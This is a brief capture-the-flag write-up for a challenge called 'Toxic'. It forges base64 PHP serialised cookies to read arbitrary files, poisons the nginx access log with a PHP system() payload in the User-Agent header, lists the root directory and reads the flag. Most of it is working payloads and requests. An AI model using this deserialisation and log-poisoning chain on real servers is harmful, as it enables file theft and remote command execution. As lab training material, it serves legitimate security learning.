# Toxic
The following is a quick  writeup for the Toxic challenge.

By inspecting the challenge's files, specifically index.php and PageModel.php, we see that our phpsessid cookie is deserialised, and the file to display on the screen is retrieved from the deserialised object.

The cookie is converted to ascii and the object is produced
```
echo 'Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9' | base64 -d
O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
```
While we are able to read and modify files from the server, we cannot access the flag file since we don't know its name. Therefore, we poison the server logs.

```
echo 'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}' | base64
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNz
LmxvZyI7fQo=
```
This new cookie will be sent to the server, and the log file can be read.
```
GET / HTTP/1.1
Host: 127.0.0.1:1234
User-Agent: <?php system('ls /');?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo=
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
We send this request to poison the nginx log, and when we display the log file again, we see a directory listing.
```
dev
entrypoint.sh
etc
flag_SDCCSD
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```
The cookie reads the flag file, we send it to the server, The flag is ours.
```
echo 'O:9:"PageModel":1:{s:4:"file";s:11:"/flag_SDCCSD";}' | base64

Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2ZsYWdfU0RDQ1NEIjt9
```